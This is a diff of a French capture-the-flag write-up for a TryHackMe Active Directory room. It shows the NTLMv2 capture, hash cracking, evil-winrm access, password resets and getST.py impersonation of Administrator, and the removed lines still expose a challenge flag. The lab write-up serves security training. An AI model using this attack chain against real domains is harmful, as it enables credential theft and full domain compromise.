@@ -1,19 +1,18 @@
 ---
-title: "Reset — NTLM Capture & Constrained Delegation"
+title: "TryHackMe - Reset"
 date: 2025-10-22
 platform: TryHackMe
-category: misc
-difficulty: medium
+category: realist
+difficulty: hard
 tags: [ActiveDirectory, NTLM, Kerberos, Delegation, Bloodhound]
-description: "Writeup de la room Reset sur TryHackMe — capture NTLMv2 via fichier .url piégé, escalade AD par chaîne de droits et abus de constrained delegation pour obtenir un shell Administrator."
+description: "Writeup de la room Reset sur TryHackMe - capture NTLMv2 via fichier .url piégé, escalade AD par chaîne de droits et abus de constrained delegation pour obtenir un shell Administrator."
 ---
 
-## Résumé
+## TL;DR
 
 - **Cible :** `10.10.111.252` (`haystack.thm.corp`)
-- **Accès initial :** capture NTLMv2 via fichier `.url` piégé dans `\Data\onboarding` → crack → compte `AUTOMATE`
+- **Accès initial :** capture NTLMv2 via fichier `.url` piégé dans `\Data\onboarding` → cracking → compte `AUTOMATE`
 - **Escalade :** chaîne de droits AD → reset de mots de passe → `DARLA_WINTERS` → constrained delegation → impersonation `Administrator`
-- **User flag :** `THM{AUTOMATION_WILL_REPLACE_US}`
 
 ---
 
@@ -25,7 +24,7 @@ nmap -T4 -n -sC -sV -Pn -p- $IP
 echo '10.10.111.252 thm.corp haystack.thm.corp' | sudo tee -a /etc/hosts
 ```
 
-Ports ouverts : Kerberos (88), LDAP, SMB (445), RPC, RDP — environnement Active Directory.
+Ports ouverts : Kerberos (88), LDAP, SMB (445), RPC, RDP - environnement Active Directory.
 
 ---
 
@@ -82,7 +81,7 @@ john hash --wordlist=/usr/share/wordlists/rockyou.txt
 evil-winrm -i haystack.thm.corp -u 'automate' -p 'Passw0rd1'
 ```
 
-**User flag :** `THM{AUTOMATION_WILL_REPLACE_US}`
+**User flag :** `THM{*********_****_*******_**}`
 
 ---
 
@@ -151,6 +150,8 @@ nxc smb haystack.thm.corp -u 'DARLA_WINTERS' -p 'NewPassword123@'
 ```bash
 # Synchroniser l'heure (Kerberos est sensible au décalage)
 ntpdate haystack.thm.corp
+# OR
+rdate -n haystack.thm.corp
 
 # Obtenir un TGS en impersonnant Administrator
 getST.py -spn "cifs/haystack.thm.corp" -impersonate "Administrator" "thm.corp/DARLA_WINTERS:NewPassword123@"
@@ -165,15 +166,5 @@ Shell `Administrator` obtenu.
 ```bash
 type C:\Users\Administrator\Desktop\root.txt
 ```
-
+**Root flag :** `THM{*********_****_*******_**}`
 ---
-
-## Leçons apprises
-
-| Technique | Outil |
-|-----------|-------|
-| Capture NTLMv2 | ntlm_theft + Responder |
-| AS-REP Roasting | GetNPUsers.py |
-| Enumération AD | BloodHound + bloodhound-python |
-| Abus de droits AD | net rpc password |
-| Constrained Delegation | getST.py + wmiexec.py |
